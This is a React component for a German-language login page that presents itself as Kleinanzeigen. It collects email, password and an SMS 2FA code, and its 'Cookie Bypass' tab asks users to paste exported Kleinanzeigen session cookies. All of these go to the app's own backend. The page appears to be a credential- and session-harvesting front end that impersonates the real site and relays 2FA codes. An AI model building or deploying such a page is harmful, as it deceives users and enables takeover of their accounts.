import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Eye, EyeOff, Loader2 } from 'lucide-react';

export function Auth() {
  const navigate = useNavigate();
  const [mode, setMode] = useState<'standard' | 'cookie'>('standard');
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [cookieJson, setCookieJson] = useState('');
  const [smsCode, setSmsCode] = useState('');
  const [sessionId, setSessionId] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  
  const [errors, setErrors] = useState<{ email?: string; password?: string; cookie?: string; code?: string; top?: string }>({});

  const validateEmail = () => {
    if (!email) {
      setErrors({ email: 'Bitte gib eine E-Mail-Adresse ein.' });
      return false;
    } else if (!/\S+@\S+\.\S+/.test(email)) {
      setErrors({ email: 'Die E-Mail-Adresse ist ungültig.' });
      return false;
    }
    setErrors({});
    return true;
  };

  const validatePassword = () => {
    if (!password) {
      setErrors({ password: 'Bitte gib dein Passwort ein.' });
      return false;
    }
    setErrors({});
    return true;
  };

  const handleNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (validateEmail()) {
      setStep(2);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validatePassword()) return;

    setIsLoading(true);
    setErrors({});

    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      const data = await response.json().catch(() => ({}));

      if (!response.ok) {
        throw new Error(data.message || 'Deine Zugangsdaten sind nicht korrekt. Bitte überprüfe E-Mail und Passwort.');
      }

      if (data.requires_2fa) {
        setSessionId(data.sessionId);
        setStep(3);
        return;
      }

      // Save the JWT token so the dashboard can authenticate API calls
      if (data.accessToken) {
        localStorage.setItem('kb_session', data.accessToken);
        localStorage.setItem('token', data.accessToken);
      }

      navigate('/m-meine-anzeigen');
    } catch (error: any) {
      setErrors({ top: error.message || 'Ein Fehler ist aufgetreten.' });
    } finally {
      setIsLoading(false);
    }
  };

  const handle2FASubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!smsCode) {
      setErrors({ code: 'Bitte gib den SMS-Code ein.' });
      return;
    }

    setIsLoading(true);
    setErrors({});

    try {
      const response = await fetch('/api/auth/login/2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, sessionId, code: smsCode })
      });

      if (!response.ok) {
        throw new Error('Der Code ist ungültig oder abgelaufen.');
      }

      const data2fa = await response.json().catch(() => ({}));
      if (data2fa.accessToken) {
        localStorage.setItem('kb_session', data2fa.accessToken);
        localStorage.setItem('token', data2fa.accessToken);
      }

      navigate('/m-meine-anzeigen');
    } catch (error: any) {
      setErrors({ top: error.message || 'Ein Fehler ist aufgetreten.' });
    } finally {
      setIsLoading(false);
    }
  };

  const handleCookieLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setErrors({ email: 'Bitte gib eine E-Mail-Adresse ein.' });
      return;
    }
    if (!cookieJson) {
      setErrors({ cookie: 'Bitte füge deine Cookies ein.' });
      return;
    }

    setIsLoading(true);
    setErrors({});

    try {
      const response = await fetch('/api/auth/login/cookie', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, cookies: cookieJson })
      });

      if (!response.ok) {
        throw new Error('Ungültiges Cookie-Format. Bitte JSON-Array einfügen.');
      }

      const cookieData = await response.json().catch(() => ({}));
      if (cookieData.accessToken) {
        localStorage.setItem('kb_session', cookieData.accessToken);
        localStorage.setItem('token', cookieData.accessToken);
      }

      navigate('/m-meine-anzeigen');
    } catch (error: any) {
      setErrors({ top: error.message || 'Ein Fehler ist aufgetreten.' });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f7f7f7] flex flex-col justify-center py-12 px-4 sm:px-6 lg:px-8 font-sans">
      <div className="sm:mx-auto sm:w-full sm:max-w-[440px]">
        
        {errors.top && (
          <div className="mb-4 bg-[#fff0f0] border border-red-200 text-red-600 text-[14px] px-4 py-3 rounded-md text-center animate-in fade-in">
            {errors.top}
          </div>
        )}

        <div className="bg-white py-10 px-8 border border-[#eaeaea] rounded-xl shadow-[0_2px_15px_-3px_rgba(0,0,0,0.07),0_10px_20px_-2px_rgba(0,0,0,0.04)]">
          <div className="text-center mb-6">
            <h2 className="text-[24px] font-bold text-[#222222]">
              Willkommen bei Kleinanzeigen!
            </h2>
            <p className="text-[14px] text-[#666666] mt-2">
              Gut für deinen Geldbeutel, gut für die Umwelt - jetzt einloggen.
            </p>
          </div>

          <div className="flex border-b border-[#eaeaea] mb-6">
            <button
              onClick={() => setMode('standard')}
              className={`flex-1 pb-3 text-[15px] font-semibold transition-colors ${mode === 'standard' ? 'text-[#333] border-b-2 border-[#A8C300]' : 'text-[#888] hover:text-[#555]'}`}
            >
              Standard Login
            </button>
            <button
              onClick={() => setMode('cookie')}
              className={`flex-1 pb-3 text-[15px] font-semibold transition-colors ${mode === 'cookie' ? 'text-[#333] border-b-2 border-[#A8C300]' : 'text-[#888] hover:text-[#555]'}`}
            >
              Cookie Bypass
            </button>
          </div>

          {mode === 'standard' ? (
            <form className="flex flex-col gap-y-4" onSubmit={step === 1 ? handleNext : step === 2 ? handleLogin : handle2FASubmit}>
              
              {step === 1 && (
                <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                  <input
                    id="email"
                    type="email"
                    placeholder="E-Mail*"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className={`appearance-none block w-full px-4 py-3 border ${errors.email ? 'border-red-500' : 'border-[#dcdcdc]'} rounded-md placeholder-gray-500 focus:outline-none focus:border-[#333] text-[16px] transition-colors`}
                  />
                  {errors.email && <p className="mt-1 text-[12px] text-red-500">{errors.email}</p>}
                </div>
              )}

              {step === 2 && (
                <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                  <div className="relative">
                    <input
                      id="password"
                      type={showPassword ? 'text' : 'password'}
                      placeholder="Passwort*"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className={`appearance-none block w-full px-4 py-3 border ${errors.password ? 'border-red-500' : 'border-[#dcdcdc]'} rounded-md placeholder-gray-500 focus:outline-none focus:border-[#333] text-[16px] transition-colors pr-12`}
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute inset-y-0 right-0 pr-4 flex items-center text-[#666] hover:text-[#333] focus:outline-none"
                    >
                      {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                    </button>
                  </div>
                  {errors.password && <p className="mt-1 text-[12px] text-red-500">{errors.password}</p>}
                  
                  <div className="mt-2 text-left">
                    <button type="button" onClick={() => setStep(1)} className="text-[14px] font-medium text-[#005d9e] hover:underline">
                      &larr; E-Mail ändern
                    </button>
                  </div>
                </div>
              )}

              {step === 3 && (
                <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                  <div className="bg-[#f0f9ff] border border-[#bae6fd] rounded-md p-4 mb-4">
                    <p className="text-[14px] text-[#0369a1] font-medium text-center">
                      Kleinanzeigen verlangt einen SMS-Code. Bitte gib den Code ein, der an deine Nummer gesendet wurde.
                    </p>
                  </div>
                  <input
                    id="smscode"
                    type="text"
                    placeholder="6-stelliger SMS Code"
                    value={smsCode}
                    onChange={(e) => setSmsCode(e.target.value)}
                    className={`appearance-none block w-full px-4 py-3 border ${errors.code ? 'border-red-500' : 'border-[#dcdcdc]'} rounded-md placeholder-gray-500 focus:outline-none focus:border-[#333] text-[16px] text-center tracking-widest transition-colors`}
                  />
                  {errors.code && <p className="mt-1 text-[12px] text-red-500 text-center">{errors.code}</p>}
                </div>
              )}

              <div className="mt-4">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full flex justify-center items-center py-3.5 px-4 border border-transparent rounded-full text-[16px] font-bold text-[#333] bg-[#A8C300] hover:bg-[#96ae00] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#A8C300] transition-colors disabled:opacity-70"
                >
                  {isLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : (step === 1 ? 'Weiter' : step === 2 ? 'Anmelden' : 'Code Bestätigen')}
                </button>
              </div>
            </form>
          ) : (
            <form className="flex flex-col gap-y-4 animate-in fade-in slide-in-from-right-4 duration-300" onSubmit={handleCookieLogin}>
              <div className="bg-[#f8fafc] border border-[#e2e8f0] rounded-md p-4 mb-2">
                <p className="text-[13px] text-[#475569] leading-relaxed">
                  Logge dich sicher ohne Passwort ein. Nutze die Erweiterung "EditThisCookie", um deine Kleinanzeigen-Session zu exportieren und füge sie hier ein.
                </p>
              </div>

              <input
                type="email"
                placeholder="E-Mail (zur Identifikation)"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`appearance-none block w-full px-4 py-3 border ${errors.email ? 'border-red-500' : 'border-[#dcdcdc]'} rounded-md placeholder-gray-500 focus:outline-none focus:border-[#333] text-[15px] transition-colors`}
              />
              {errors.email && <p className="mt-1 text-[12px] text-red-500">{errors.email}</p>}

              <textarea
                placeholder="JSON Cookies einfügen (z.B. [{...}])"
                value={cookieJson}
                onChange={(e) => setCookieJson(e.target.value)}
                rows={4}
                className={`appearance-none block w-full px-4 py-3 border ${errors.cookie ? 'border-red-500' : 'border-[#dcdcdc]'} rounded-md placeholder-gray-500 focus:outline-none focus:border-[#333] text-[13px] font-mono transition-colors resize-none`}
              />
              {errors.cookie && <p className="mt-1 text-[12px] text-red-500">{errors.cookie}</p>}

              <div className="mt-4">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full flex justify-center items-center py-3.5 px-4 border border-transparent rounded-full text-[16px] font-bold text-[#333] bg-[#A8C300] hover:bg-[#96ae00] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#A8C300] transition-colors disabled:opacity-70"
                >
                  {isLoading ? <Loader2 className="h-5 w-5 animate-spin" /> : 'Sicher Einloggen'}
                </button>
              </div>
            </form>
          )}

        </div>
      </div>
    </div>
  );
}
